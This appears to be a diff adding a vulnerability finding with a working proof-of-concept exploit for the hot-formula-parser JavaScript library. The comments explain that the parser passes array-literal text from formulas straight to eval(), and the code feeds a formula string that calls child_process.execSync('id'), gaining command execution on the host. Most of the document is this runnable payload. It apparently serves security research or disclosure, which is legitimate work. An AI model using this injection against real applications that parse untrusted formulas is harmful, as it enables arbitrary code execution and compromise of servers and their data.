@@ -1,0 +1,21 @@
+Confirmed arbitrary code execution via `eval` in the `arr` case of the grammar parser. Here's the exploit:
+
+```javascript
+// Exploit for hot-formula-parser: eval() code injection via array literal
+// The generated grammar parser (lib/grammar-parser/grammar-parser.js) contains:
+//   case 39: var arr = eval("[" + yytext + "]");
+// where yytext is the raw, attacker-controlled text matched by the ARRAY
+// lexer rule (/^(?:\[(.*)?\])/). Any formula string containing "[...]"
+// has its contents passed directly to eval(), allowing arbitrary JS/OS
+// command execution.
+
+const { Parser } = require("hot-formula-parser");
+
+const parser = new Parser();
+
+const result = parser.parse(
+  "SUM([require('child_process').execSync('id').toString()])"
+);
+
+console.log("Parser result:", result);
+```
